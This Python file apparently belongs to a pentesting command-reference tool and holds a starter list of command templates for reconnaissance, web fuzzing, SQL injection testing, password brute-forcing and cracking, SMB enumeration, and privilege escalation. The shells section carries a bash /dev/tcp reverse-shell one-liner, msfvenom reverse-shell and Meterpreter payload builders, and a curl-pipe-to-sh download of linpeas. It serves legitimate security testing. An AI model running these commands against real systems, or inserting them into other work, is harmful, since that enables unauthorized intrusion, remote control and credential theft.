"""The built-in starter pack: common pentesting commands to get a new install going.

Placeholders such as <target> are meant to be replaced when you use the command.
"""

from clihax.utils.helpers import ToolDict


def _entry(tool: str, command: str, description: str, category: str, *tags: str) -> ToolDict:
    return {
        "tool": tool,
        "command": command,
        "description": description,
        "category": category,
        "tags": list(tags),
    }


WORDLIST = "/usr/share/wordlists/dirb/common.txt"
ROCKYOU = "/usr/share/wordlists/rockyou.txt"

STARTER_TOOLS: list[ToolDict] = [
    # ----- recon -----
    _entry("nmap", "nmap -sC -sV -oA scan <target>",
           "Default scripts and version detection, saved in all formats", "recon", "nmap", "scan"),
    _entry("nmap", "nmap -p- --min-rate 5000 -T4 <target>",
           "Fast scan of all 65535 TCP ports", "recon", "nmap", "scan", "ports"),
    _entry("nmap", "nmap -sU --top-ports 100 <target>",
           "Scan the 100 most common UDP ports", "recon", "nmap", "udp"),
    _entry("masscan", "masscan -p1-65535 <target> --rate 1000",
           "Very fast port scan (keep the rate polite)", "recon", "scan", "ports"),
    _entry("subfinder", "subfinder -d <domain>",
           "Passive subdomain discovery", "recon", "dns", "subdomains"),
    _entry("amass", "amass enum -d <domain>",
           "Subdomain enumeration", "recon", "dns", "subdomains"),
    _entry("dnsrecon", "dnsrecon -d <domain> -t std",
           "Standard DNS record enumeration", "recon", "dns"),
    # ----- web -----
    _entry("gobuster", f"gobuster dir -u http://<target> -w {WORDLIST}",
           "Brute-force directories and files", "web", "directories", "brute-force"),
    _entry("gobuster", f"gobuster dns -d <domain> -w {WORDLIST}",
           "Brute-force subdomains", "web", "dns", "subdomains"),
    _entry("ffuf", f"ffuf -u http://<target>/FUZZ -w {WORDLIST}",
           "Fuzz for directories and files", "web", "fuzzing", "directories"),
    _entry("ffuf", 'ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w <wordlist> -fs <size>',
           "Find virtual hosts (filter out the default response size)", "web", "fuzzing", "vhost"),
    _entry("nikto", "nikto -h http://<target>",
           "Web server vulnerability scan", "web", "scan", "vulnerabilities"),
    _entry("whatweb", "whatweb -a 3 http://<target>",
           "Identify web technologies", "web", "fingerprint"),
    _entry("wpscan", "wpscan --url http://<target> --enumerate u,vp",
           "WordPress scan: users and vulnerable plugins", "web", "wordpress", "scan"),
    _entry("sqlmap", 'sqlmap -u "http://<target>/page.php?id=1" --batch --dbs',
           "Test a parameter for SQL injection and list databases", "web", "sqli"),
    # ----- passwords -----
    _entry("hydra", f"hydra -l <user> -P {ROCKYOU} ssh://<target>",
           "Brute-force SSH login", "passwords", "brute-force", "ssh"),
    _entry("hydra", 'hydra -l <user> -P <wordlist> <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
           "Brute-force a web login form", "passwords", "brute-force", "web"),
    _entry("hashcat", f"hashcat -m 0 -a 0 hashes.txt {ROCKYOU}",
           "Crack MD5 hashes with a wordlist (change -m for other hash types)", "passwords", "hashes", "cracking"),
    _entry("john", f"john --wordlist={ROCKYOU} hashes.txt",
           "Crack hashes with John the Ripper", "passwords", "hashes", "cracking"),
    # ----- smb -----
    _entry("smbclient", "smbclient -L //<target> -N",
           "List SMB shares without a password", "smb", "shares", "enum"),
    _entry("smbmap", "smbmap -H <target>",
           "Show SMB shares and permissions", "smb", "shares", "enum"),
    _entry("enum4linux", "enum4linux -a <target>",
           "Full SMB/Windows enumeration", "smb", "enum"),
    _entry("netexec", "netexec smb <target> -u <user> -p <password>",
           "Check SMB credentials", "smb", "credentials"),
    # ----- shells -----
    _entry("netcat", "nc -lvnp <lport>",
           "Listen for a reverse shell", "shells", "listener"),
    _entry("bash", "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
           "Bash reverse shell one-liner", "shells", "reverse-shell"),
    _entry("msfvenom", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
           "Linux reverse shell payload", "shells", "payload", "linux"),
    _entry("msfvenom", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
           "Windows Meterpreter payload", "shells", "payload", "windows", "meterpreter"),
    _entry("python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
           "Upgrade a dumb shell to an interactive TTY", "shells", "tty", "stabilize"),
    # ----- privilege escalation -----
    _entry("sudo", "sudo -l",
           "List what the current user may run with sudo", "privesc", "linux", "enum"),
    _entry("find", "find / -perm -4000 -type f 2>/dev/null",
           "Find SUID binaries", "privesc", "linux", "suid"),
    _entry("linpeas", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
           "Automated Linux privilege escalation checks", "privesc", "linux", "enum"),
    # ----- file transfer -----
    _entry("python3", "python3 -m http.server 8000",
           "Serve the current folder over HTTP", "transfer", "http", "server"),
    _entry("wget", "wget http://<lhost>:8000/<file>",
           "Download a file from your machine", "transfer", "http", "download"),
]
